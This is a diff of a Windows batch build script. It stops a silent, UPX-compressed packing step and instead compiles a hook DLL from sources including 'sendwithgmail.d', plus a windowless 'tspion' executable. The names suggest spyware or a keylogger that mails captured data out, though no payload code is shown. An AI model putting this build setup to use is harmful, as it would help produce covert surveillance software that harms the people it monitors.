@@ -1,7 +1,5 @@
 @echo off
 
-echo Packing in silent mode
-
    REM Copyright 2010 Jimmy Cao
 
    REM Licensed under the Apache License, Version 2.0 (the "License");
@@ -15,10 +13,14 @@ echo Packing in silent mode
    REM WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    REM See the License for the specific language governing permissions and
    REM limitations under the License.
-
-IF NOT EXIST packed MKDIR packed
-cd packed
-dmd -L/exet:nt/su:windows:4.0 -version=Silent -J.. -release -O -inline ..\launch.d
-del *.obj *.map
-upx launch.exe
+IF NOT EXIST test MKDIR test
+cd test
+dmd -release -O -inline -version=testing_smtp -ofhook.dll ..\hook.d ..\hook.def ..\dll.d ..\sendwithgmail.d ..\etc.curl.d
+dmd -L/exet:nt/su:windows:4.0 -release -O -inline ..\tspion.d
+del hook.map
+del hook.obj
+del tspion.map
+del tspion.obj
 cd ..
+echo Build complete
+
